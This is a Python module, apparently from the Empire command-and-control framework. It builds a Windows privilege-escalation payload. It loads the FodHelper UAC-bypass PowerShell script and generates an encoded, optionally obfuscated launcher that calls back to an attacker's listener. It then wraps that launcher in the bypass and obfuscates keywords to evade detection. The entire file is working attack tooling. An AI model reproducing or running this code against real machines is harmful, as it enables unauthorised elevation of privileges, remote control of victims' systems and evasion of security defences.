from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False

        listener_name = params['Listener']

        # staging options
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/privesc/Invoke-FodHelperBypass.ps1"

        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()

        script = module_code

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                           obfuscate=obfuscate,
                                                           obfuscationCommand=obfuscate_command, userAgent=user_agent,
                                                           proxy=proxy,
                                                           proxyCreds=proxy_creds, bypasses=params['Bypasses'])

            enc_script = launcher.split(" ")[-1]
            if launcher == "":
                return handle_error_message("[!] Error in launcher generation.")
            else:
                script += "Invoke-FodHelperBypass -Command \"%s\"" % (enc_script)
                script = data_util.keyword_obfuscation(script)
                return script
